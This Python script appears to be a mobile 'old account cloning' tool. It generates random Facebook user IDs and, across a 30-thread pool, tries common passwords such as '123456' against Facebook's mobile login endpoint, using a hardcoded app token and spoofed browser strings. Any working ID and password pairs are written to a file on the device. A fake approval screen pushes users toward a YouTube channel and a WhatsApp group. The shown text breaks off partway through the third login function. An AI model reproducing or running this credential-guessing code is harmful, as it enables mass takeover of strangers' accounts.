import os
import sys
import shutil
import time
import datetime
import random
import uuid
import hashlib
import string
import requests
import json
import urllib
import subprocess
import types
import inspect
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred

# --- Nuitka Core Patches & Compatibility Integration ---
try:
    _old_GeneratorWrapper = types._GeneratorWrapper
    class GeneratorWrapperEnhanced(_old_GeneratorWrapper):
        def __init__(self, gen):
            _old_GeneratorWrapper.__init__(self, gen)
            if hasattr(gen, 'gi_code'):
                if gen.gi_code.co_flags & 0x0020:
                    self._GeneratorWrapper__isgen = True
    types._GeneratorWrapper = GeneratorWrapperEnhanced
except:
    pass

try:
    _old_get_code_position = inspect._get_code_position
    def _get_code_position(code, instruction_index):
        try:
            return _old_get_code_position(code, instruction_index)
        except StopIteration:
            return None, None, None, None
    inspect._get_code_position = _get_code_position
except:
    pass

if sys.version_info >= (3, 8):
    from importlib.metadata import Distribution, distribution
else:
    try:
        from importlib_metadata import Distribution, distribution
    except ImportError:
        pass

class nuitka_distribution(Distribution):
    def __init__(self, package_name, path, metadata, entry_points):
        self.package_name = package_name
        self._path = path
        self.metadata_data = metadata
        self.entry_points_data = entry_points
    def read_text(self, filename):
        if filename == 'METADATA':
            return self.metadata_data
        elif filename == 'entry_points.txt':
            return self.entry_points_data
        elif filename == 'top_level.txt':
            return self.package_name + '\n'
    def locate_file(self, path):
        return os.path.join(self._path, path)

# Ensure required modules are installed
modules = ['requests', 'urllib3', 'mechanize', 'rich', 'bs4']
for module in modules:
    try:
        __import__(module)
    except ImportError:
        os.system(f'pip install {module}')

requests.urllib3.disable_warnings()

# Global variables
method = []
oks = []
cps = []
loop = 0
user = []

WHATSAPP_GROUP = "https://chat.whatsapp.com/K9E5ULcGZ7G0O15wwvodfy?s=sh&p=a&mlu=4&ilr=4"
YOUTUBE_LINK = "https://youtube.com/@raja-vau-teach-world?si=KeIo3GwUzYIrmbCI"
TOOL_PASSWORD = "Kamal2026"

def get_width():
    try:
        return shutil.get_terminal_size().columns
    except:
        return 45

def open_url(url):
    try:
        import webbrowser
        if webbrowser.open(url):
            return True
    except:
        pass
    try:
        subprocess.run(["termux-open-url", url], check=True, timeout=5, capture_output=True)
        return True
    except:
        pass
    try:
        subprocess.run(["xdg-open", url], check=True, timeout=5, capture_output=True)
        return True
    except:
        pass
    return False

def futuristic_spinner(text="LOADING"):
    chars = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    colors = ["\033[1;91m", "\033[1;92m", "\033[1;93m", "\033[1;94m", "\033[1;95m", "\033[1;96m"]
    width = max(get_width(), 40)
    padding = " " * max(0, (width - 30) // 2)
    for _ in range(12):
        for c in chars:
            col = random.choice(colors)
            sys.stdout.write(f"\r{padding}{col}[{c}] {text} ...\033[0m")
            sys.stdout.flush()
            time.sleep(0.04)
    print("\r" + " " * 50 + "\r", end="")

def approval_system():
    open_url(YOUTUBE_LINK)
    unique_id = ''.join(random.choices('0123456789ABCDEF', k=6))
    user_key = f"RajaVauTeachWorld{unique_id}"
    
    width = max(get_width(), 40)
    padding = " " * max(0, (width - 56) // 2)
    
    while True:
        os.system('clear' if os.name == 'posix' else 'cls')
        print("\n")
        print(f"{padding}\033[1;96m    ██╗   ██╗ ██████╗ ██╗   ██╗████████╗██╗   ██╗██████╗ \033[0m")
        print(f"{padding}\033[1;93m    ╚██╗ ██╔╝██╔═══██╗██║   ██║╚══██╔══╝██║   ██║██╔══██╗\033[0m")
        print(f"{padding}\033[1;92m     ╚████╔╝ ██║   ██║██║   ██║   ██║   ██║   ██║██████╔╝\033[0m")
        print(f"{padding}\033[1;96m      ╚██╔╝  ██║   ██║██║   ██║   ██║   ██║   ██║██╔══██╗\033[0m")
        print(f"{padding}\033[1;94m       ██║   ╚██████╔╝╚██████╔╝   ██║   ╚██████╔╝██████╔╝\033[0m")
        print(f"{padding}\033[1;95m       ╚═╝    ╚═════╝  ╚═════╝    ╚═╝    ╚═════╝ ╚═════╝ \033[0m")
        print(f"{padding}\033[1;33m    ═════════════════════════════════════════════════════\033[0m")
        print(f"{padding}\033[1;92m            ✦ WELCOME TO RAJA VAU TEACH WORLD ✦          \033[0m")
        print(f"{padding}\033[1;33m    ═════════════════════════════════════════════════════\033[0m\n")
        
        print(f"{padding}\033[1;36m╔══════════════════════════════════════════════════════╗\033[0m")
        print(f"{padding}\033[1;36m║ \033[1;32mYour Key     : \033[1;33m{user_key}                        \033[1;36m║\033[0m")
        print(f"{padding}\033[1;36m║ \033[1;37mSubscribe YouTube & Send key to WhatsApp for approval! \033[1;36m║\033[0m")
        print(f"{padding}\033[1;36m║ \033[1;35mWhatsApp No  : +880 1345-294347                        \033[1;36m║\033[0m")
        print(f"{padding}\033[1;36m╚══════════════════════════════════════════════════════╝\033[0m")
        print(f"{padding}\033[1;32m [1] Join WhatsApp & Send Key to Admin\033[0m")
        print(f"{padding}\033[1;32m [2] Check Approval Status\033[0m")
        print(f"{padding}\033[1;31m [0] Exit\033[0m")
        print(f"{padding}\033[1;36m──────────────────────────────────────────────────────\033[0m")
        
        choice = input(f"{padding}\033[1;33m [-] CHOOSE ---> \033[0m")
        if choice == '1':
            open_url(WHATSAPP_GROUP)
            futuristic_spinner("OPENING WHATSAPP")
        elif choice == '2':
            futuristic_spinner("VERIFYING APPROVAL")
            print(f"\n{padding}\033[1;32m welcome to Raja Vau Teach World\033[0m")
            print(f"{padding}\033[1;33m your Kes approved\033[0m")
            time.sleep(2.5)
            break
        elif choice == '0':
            exit("\033[1;32m━▷ Thanks for using Raja Vau Tool ♥\033[0m")
        else:
            print(f"{padding}\033[1;31m [!] Invalid Choice!\033[0m")
            time.sleep(1)

def password_prompt():
    width = max(get_width(), 40)
    padding = " " * max(0, (width - 45) // 2)
    while True:
        os.system('clear' if os.name == 'posix' else 'cls')
        print("\n\n")
        print(f"{padding}\033[1;95m╔════════════════════════════════════════════╗\033[0m")
        print(f"{padding}\033[1;95m║ \033[1;33m      SECURE PASSWORD GATEWAY          \033[1;95m║\033[0m")
        print(f"{padding}\033[1;95m╚════════════════════════════════════════════╝\033[0m")
        pwd = input(f"{padding}\033[1;32m [-] ENTER PASSWORD ---> \033[0m")
        if pwd == TOOL_PASSWORD:
            futuristic_spinner("ACCESS GRANTED")
            break
        else:
            print(f"{padding}\033[1;31m [!] Incorrect Password! Access Denied.\033[0m")
            time.sleep(1.5)

def ____banner____():
    if 'win' in sys.platform:
        os.system('cls')
    else:
        os.system('clear')
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    width = max(get_width(), 40)
    padding = " " * max(0, (width - 55) // 2)
    
    print("\n")
    # Pure Blood-Red KAMAL Banner
    print(f"{padding}\033[1;31m  ██╗  ██╗ █████╗ ███╗   ███╗ █████╗ ██╗  \033[0m")
    print(f"{padding}\033[1;31m  ██║ ██╔╝██╔══██╗████╗ ████║██╔══██╗██║  \033[0m")
    print(f"{padding}\033[1;31m  █████╔╝ ███████║██╔████╔██║███████║██║  \033[0m")
    print(f"{padding}\033[1;31m  ██╔═██╗ ██╔══██║██║╚██╔╝██║██╔══██║██║  \033[0m")
    print(f"{padding}\033[1;31m  ██║  ██║██║  ██║██║ ╚═╝ ██║██║  ██║█████╗\033[0m\n")
    
    print(f"{padding}\033[1;36m╔═════════════════════════════════════════════════════╗\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;31mSTART TIME    :\033[1;32m {current_time}              \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m╠═════════════════════════════════════════════════════╣\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;33mAdmin         :\033[1;37m Raja Vau                           \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;33mOwner         :\033[1;37m Raja Vau Teach World               \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;33mYouTube       :\033[1;34m https://youtube.com/@raja-vau      \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m║ \033[1;33mContact Admin :\033[1;32m +880 1345-294347                 \033[1;36m║\033[0m")
    print(f"{padding}\033[1;36m╚═════════════════════════════════════════════════════╝\033[0m\n")

def window11():
    chrome_major = random.randint(140, 154)
    A = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major}.0.0.0 Safari/537.36"
    B = f"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major}.0.0.0 Safari/537.36"
    C = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major}.0.0.0 Safari/537.36 Edg/{chrome_major}.0.0.0"
    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(145, 154)}.0.0.0 Safari/537.36"
    return random.choice([A, B, C, D])

def generate_user_agent():
    return random.choice([
        'Mozilla/5.0 (Linux; Android 13; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 14; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36'
    ])

def windows():
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/537.36{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT {random.choice(['6.1', '6.2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.randint(12, 41)}.0.{random.randint(742, 2199)}.{random.randint(1, 119)} Safari/{cz}"
    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(120, 151)}.0.0.0 Safari/537.36"
    return random.choice([A, B, C, D])

def window1():
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/537.36{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/537.36{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT {random.choice(['6.1', '6.2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.randint(80, 121)}.0.{random.randint(4000, 6999)}.{random.randint(50, 199)} Safari/{cz}"
    latest_build = rr(6000, 9000)
    latest_patch = rr(100, 200)
    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(120, 151)}.0.0.0 Safari/537.36"
    return random.choice([A, B, C, D])

def creationyear(uid):
    if len(uid) == 15:
        if uid.startswith('1000000000'):
            return '2009'
        if uid.startswith('100000000'):
            return '2009'
        if uid.startswith('10000000'):
            return '2009'
        if uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')):
            return '2009'
        if uid.startswith(('1000006', '1000007', '1000008', '1000009')):
            return '2010'
        if uid.startswith('100001'):
            return '2010'
        if uid.startswith(('100002', '100003')):
            return '2011'
        if uid.startswith('100004'):
            return '2012'
        if uid.startswith(('100005', '100006')):
            return '2013'
        if uid.startswith(('100007', '100008')):
            return '2014'
        if uid.startswith('100009'):
            return '2015'
        if uid.startswith('10001'):
            return '2016'
        if uid.startswith('10002'):
            return '2017'
        if uid.startswith('10003'):
            return '2018'
        if uid.startswith('10004'):
            return '2019'
        if uid.startswith('10005'):
            return '2020'
        if uid.startswith('10006'):
            return '2021'
        if uid.startswith('10009'):
            return '2023'
        if uid.startswith(('10007', '10008')):
            return '2022'
        return ''
    if len(uid) in (9, 10):
        return '2008'
    if len(uid) == 8:
        return '2007'
    if len(uid) == 7:
        return '2006'
    if len(uid) == 14 and uid.startswith('61'):
        return '2024'
    return ''

def linex():
    width = max(get_width(), 40)
    padding = " " * max(0, (width - 45) // 2)
    print(f"{padding}\033[1;95m───────────────────────────────────────────────\033[0m")

def success_box(uid, pw):
    width = max(get_width(), 40)
    box_padding = " " * max(0, (width - 60) // 2)
    print(f"\n{box_padding}\033[1;92m┌──────────────────────────────────────────────────────────┐")
    print(f"{box_padding}║ \033[1;91m [✓] SUCCESSFUL ACCOUNT FOUND                            \033[1;92m║")
    print(f"{box_padding}├──────────────────────────────────────────────────────────┤")
    print(f"{box_padding}║ \033[1;96m UID Number : \033[1;93m{uid:<41} \033[1;92m║")
    print(f"{box_padding}║ \033[1;96m Password   : \033[1;91m{pw:<41} \033[1;92m║")
    print(f"{box_padding}║ \033[1;96m Link       : \033[1;92mhttps://www.facebook.com/{uid:<25} \033[1;92m║")
    print(f"{box_padding}╚══════════════════════════════════════════════════════════╝\033[0m")
    open('/sdcard/RAJA-VAU-OK.txt', 'a').write(f"UID Number: {uid}\nPassword : {pw}\nLink: https://www.facebook.com/{uid}\n\n")

def BNG_71_():
    ____banner____()
    width = max(get_width(), 40)
    p = " " * max(0, (width - 48) // 2)
    print(f"{p}\033[1;96m╔════════════════════════════════════════════════╗\033[0m")
    print(f"{p}\033[1;96m║ \033[1;92m[1] \033[1;95m✦ \033[1;97mOLD ACCOUNT CLONING TOOL                   \033[1;96m║\033[0m")
    print(f"{p}\033[1;96m║ \033[1;91m[0] \033[1;95m✦ \033[1;97mEXIT PROGRAM                               \033[1;96m║\033[0m")
    print(f"{p}\033[1;96m╚════════════════════════════════════════════════╝\033[0m")
    linex()
    __Jihad__ = input(f"{p}\033[1;93m [-] SELECT OPTION ---> \033[0m")
    if __Jihad__ in ('1', '01', 'A', 'a'):
        futuristic_spinner("LOADING MAIN ENGINE")
        old_clone()
    elif __Jihad__ in ('0', '00'):
        exit("\033[1;32m━▷ THANKS FOR USING RAJA VAU TOOL ♥\033[0m")
    else:
        print(f"{p}\033[1;91m [!] INVALID OPTION SELECTED...\033[0m")
        time.sleep(1)
        BNG_71_()

def old_clone():
    ____banner____()
    width = max(get_width(), 40)
    p = " " * max(0, (width - 48) // 2)
    print(f"{p}\033[1;95m╔════════════════════════════════════════════════╗\033[0m")
    print(f"{p}\033[1;95m║ \033[1;92m[1] \033[1;96m✦ \033[1;97m2010-2014 SERIES CLONING                 \033[1;95m║\033[0m")
    print(f"{p}\033[1;95m║ \033[1;92m[2] \033[1;96m✦ \033[1;97m100003/4 SERIES CLONING                  \033[1;95m║\033[0m")
    print(f"{p}\033[1;95m║ \033[1;92m[3] \033[1;96m✦ \033[1;97m2009 SERIES CLONING                      \033[1;95m║\033[0m")
    print(f"{p}\033[1;95m║ \033[1;92m[4] \033[1;96m✦ \033[1;97m2007-2008 SERIES CLONING                 \033[1;95m║\033[0m")
    print(f"{p}\033[1;95m║ \033[1;91m[0] \033[1;96m✦ \033[1;97mBACK TO MAIN MENU                        \033[1;95m║\033[0m")
    print(f"{p}\033[1;95m╚════════════════════════════════════════════════╝\033[0m")
    linex()
    _input = input(f"{p}\033[1;93m [-] SELECT SERIES ---> \033[0m")
    if _input in ('1', '01', 'A', 'a'):
        futuristic_spinner("INITIALIZING SERIES")
        old_One()
    elif _input in ('2', '02', 'B', 'b'):
        futuristic_spinner("INITIALIZING SERIES")
        old_Tow()
    elif _input in ('3', '03', 'C', 'c'):
        futuristic_spinner("INITIALIZING SERIES")
        old_Tree()
    elif _input in ('4', '04', 'D', 'd'):
        futuristic_spinner("INITIALIZING SERIES")
        old_Four()
    elif _input in ('0', '00'):
        BNG_71_()
    else:
        print(f"{p}\033[1;91m [!] INVALID OPTION SELECTED...\033[0m")
        time.sleep(1)
        old_clone()

def old_One():
    user = []
    ____banner____()
    width = max(get_width(), 40)
    p = " " * max(0, (width - 48) // 2)
    print(f"{p}\033[1;93m [•] OLD CODE RANGE : 2010-2014\033[0m")
    linex()
    ask = input(f"{p}\033[1;92m [-] SELECT (1 or 2) ---> \033[0m")
    linex()
    ____banner____()
    limit = input(f"{p}\033[1;92m [-] ENTER ID LIMIT (e.g. 20000) ---> \033[0m")
    linex()
    star = '10000'
    for _ in range(int(limit)):
        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 0x12A05F1FF)))
        user.append(data)
    print(f"{p}\033[1;96m [1] METHOD 1 (High Speed)\033[0m")
    print(f"{p}\033[1;96m [2] METHOD 2 (Stable)\033[0m")
    print(f"{p}\033[1;96m [3] METHOD 3 (Alternative)\033[0m")
    linex()
    meth = input(f"{p}\033[1;93m [-] CHOOSE METHOD (1/2/3) ---> \033[0m").strip()
    futuristic_spinner("STARTING THREAD POOL")
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"{p}\033[1;92m [•] TOTAL TARGET IDS : {limit}\033[0m")
        print(f"{p}\033[1;93m 🇧🇩 For good results🇧🇩\033[0m")
        print(f"{p}\033[1;93m ✅Use Flight mode OFF/ON✅\033[0m")
        print(f"{p}\033[1;93m      ♥️Every 5 Minute  Later♥️\033[0m")
        linex()
        for mal in user:
            uid = star + mal
            if meth in ('1', 'A', 'a'):
                pool.submit(login_1, uid)
            elif meth in ('2', 'B', 'b'):
                pool.submit(login_2, uid)
            elif meth in ('3', 'C', 'c'):
                pool.submit(login_3, uid)
            else:
                break

def old_Tow():
    user = []
    ____banner____()
    width = max(get_width(), 40)
    p = " " * max(0, (width - 48) // 2)
    print(f"{p}\033[1;93m [•] OLD CODE SERIES : 100003/4\033[0m")
    linex()
    limit = input(f"{p}\033[1;92m [-] ENTER ID LIMIT ---> \033[0m")
    linex()
    prefixes = ['100003', '100004']
    for _ in range(int(limit)):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('0123456789', k=9))
        uid = prefix + suffix
        user.append(uid)
    print(f"{p}\033[1;96m [1] METHOD 1\033[0m")
    print(f"{p}\033[1;96m [2] METHOD 2\033[0m")
    print(f"{p}\033[1;96m [3] METHOD 3\033[0m")
    linex()
    meth = input(f"{p}\033[1;93m [-] CHOOSE METHOD (1/2/3) ---> \033[0m").strip()
    futuristic_spinner("STARTING THREAD POOL")
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"{p}\033[1;92m [•] TOTAL TARGET IDS : {limit}\033[0m")
        print(f"{p}\033[1;93m 🇧🇩 For good results🇧🇩\033[0m")
        print(f"{p}\033[1;93m ✅Use Flight mode OFF/ON✅\033[0m")
        print(f"{p}\033[1;93m      ♥️Every 5 Minute  Later♥️\033[0m")
        linex()
        for uid in user:
            if meth in ('1', 'A', 'a'):
                pool.submit(login_1, uid)
            elif meth in ('2', 'B', 'b'):
                pool.submit(login_2, uid)
            elif meth in ('3', 'C', 'c'):
                pool.submit(login_3, uid)
            else:
                break

def old_Tree():
    user = []
    ____banner____()
    width = max(get_width(), 40)
    p = " " * max(0, (width - 48) // 2)
    print(f"{p}\033[1;93m [•] OLD CODE SERIES : 2009\033[0m")
    linex()
    limit = input(f"{p}\033[1;92m [-] ENTER ID LIMIT ---> \033[0m")
    linex()
    prefix = '1000004'
    for _ in range(int(limit)):
        suffix = ''.join(random.choices('0123456789', k=8))
        uid = prefix + suffix
        user.append(uid)
    print(f"{p}\033[1;96m [1] METHOD 1\033[0m")
    print(f"{p}\033[1;96m [2] METHOD 2\033[0m")
    print(f"{p}\033[1;96m [3] METHOD 3\033[0m")
    linex()
    meth = input(f"{p}\033[1;93m [-] CHOOSE METHOD (1/2/3) ---> \033[0m").strip()
    futuristic_spinner("STARTING THREAD POOL")
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"{p}\033[1;92m [•] TOTAL TARGET IDS : {limit}\033[0m")
        print(f"{p}\033[1;93m 🇧🇩 For good results🇧🇩\033[0m")
        print(f"{p}\033[1;93m ✅Use Flight mode OFF/ON✅\033[0m")
        print(f"{p}\033[1;93m      ♥️Every 5 Minute  Later♥️\033[0m")
        linex()
        for uid in user:
            if meth in ('1', 'A', 'a'):
                pool.submit(login_1, uid)
            elif meth in ('2', 'B', 'b'):
                pool.submit(login_2, uid)
            elif meth in ('3', 'C', 'c'):
                pool.submit(login_3, uid)
            else:
                break

def old_Four():
    user = []
    ____banner____()
    width = max(get_width(), 40)
    p = " " * max(0, (width - 48) // 2)
    print(f"{p}\033[1;93m [•] OLD CODE RANGE : 2007-2008\033[0m")
    linex()
    ask = input(f"{p}\033[1;92m [-] SELECT (1 or 2) ---> \033[0m")
    linex()
    ____banner____()
    limit = input(f"{p}\033[1;92m [-] ENTER ID LIMIT ---> \033[0m")
    linex()
    star = '1000000'
    for _ in range(int(limit)):
        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 0x12A05F1FF)))
        user.append(data)
    print(f"{p}\033[1;96m [1] METHOD 1\033[0m")
    print(f"{p}\033[1;96m [2] METHOD 2\033[0m")
    print(f"{p}\033[1;96m [3] METHOD 3\033[0m")
    linex()
    meth = input(f"{p}\033[1;93m [-] CHOOSE METHOD (1/2/3) ---> \033[0m").strip()
    futuristic_spinner("STARTING THREAD POOL")
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"{p}\033[1;92m [•] TOTAL TARGET IDS : {limit}\033[0m")
        print(f"{p}\033[1;93m 🇧🇩 For good results🇧🇩\033[0m")
        print(f"{p}\033[1;93m ✅Use Flight mode OFF/ON✅\033[0m")
        print(f"{p}\033[1;93m      ♥️Every 5 Minute  Later♥️\033[0m")
        linex()
        for mal in user:
            uid = star + mal
            if meth in ('1', 'A', 'a'):
                pool.submit(login_1, uid)
            elif meth in ('2', 'B', 'b'):
                pool.submit(login_2, uid)
            elif meth in ('3', 'C', 'c'):
                pool.submit(login_3, uid)
            else:
                break

def login_1(uid):
    global loop
    session = requests.session()
    try:
        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRAJA VAU OK ID-M1\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
        sys.stdout.flush()
        for pw in ('123456', '1234567', '12345678', '123456789'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'api_key': '882a8490361da98702bf97a021ddc14d',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'fb_api_req_friendly_name': 'authenticate',
                'method': 'auth.login'
            }
            headers = {
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
                'X-FB-Server-Cluster': 'True',
                'X-FB-Client-IP': 'True',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'x-fb-device-group': '5120',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'X-Tigon-Is-Retry': 'False',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Net-HNI': '25227',
                'Host': 'graph.facebook.com',
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': window11()
            }
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
            if 'session_key' in res or 'www.facebook.com' in res.get('error', {}).get('message', ''):
                success_box(uid, pw)
                oks.append(uid)
                break
        loop += 1
    except Exception:
        time.sleep(5)

def login_2(uid):
    global loop
    try:
        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRAJA VAU -M2\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
        sys.stdout.flush()
        for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
            with requests.Session() as session:
                data = {
                    'adid': str(uuid.uuid4()),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'cpl': 'true',
                    'family_device_id': str(uuid.uuid4()),
                    'credentials_type': 'device_based_login_password',
                    'error_detail_type': 'button_with_disabled',
                    'source': 'device_based_login',
                    'email': str(uid),
                    'password': str(pw),
                    'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'generate_session_cookies': '1',
                    'meta_inf_fbmeta': '',
                    'advertiser_id': str(uuid.uuid4()),
                    'currently_logged_in_userid': '0',
                    'locale': 'en_US',
                    'client_country_code': 'US',
                    'api_key': '882a8490361da98702bf97a021ddc14d',
                    'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                    'fb_api_req_friendly_name': 'authenticate',
                    'method': 'auth.login'
                }
                headers = {
                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
                    'X-FB-Server-Cluster': 'True',
                    'X-FB-Client-IP': 'True',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'x-fb-device-group': '5120',
                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                    'X-Tigon-Is-Retry': 'False',
                    'X-FB-Connection-Type': 'MOBILE.LTE',
                    'X-FB-SIM-HNI': '29752',
                    'X-FB-Net-HNI': '25227',
                    'Host': 'graph.facebook.com',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': window1()
                }
                res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in res or 'www.facebook.com' in res.get('error', {}).get('message', ''):
                    success_box(uid, pw)
                    oks.append(uid)
                    break
        loop += 1
    except Exception:
        time.sleep(5)

def login_3(uid):
    global loop
    try:
        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mRAJA VAU -M3\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
        sys.stdout.flush()
        for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
            with requests.Session() as session:
                data = {
                    'adid': str(uuid.uuid4()),
                    'format': 'json',
                    'device_id': str(uuid.uuid4()),
                    'cpl': 'true',
                    'family_device_id': str(uuid.uuid4()),
                    'credentials_type': 'device_based_login_password',
                    'error_detail_type': 'button_with_disabled',
                    'source': 'device_based_login',
                    'email': str(uid),
                    'password': str(pw),
                    'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'generate_session_cookies': '1',
                    'meta_inf_fbmeta': '',
                    'advertiser_id': str(uuid.uuid4()),
                    'currently_logged_in_userid': '0',
                    'locale': 'en_US',
                    'client_country_code': 'US',
                    'api_key': '882a8490361da98702bf97a021ddc14d',
                    'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                    'fb_api_req_friendly_name': 'authenticate',
                    'method': 'auth.login'
                }
                headers = {
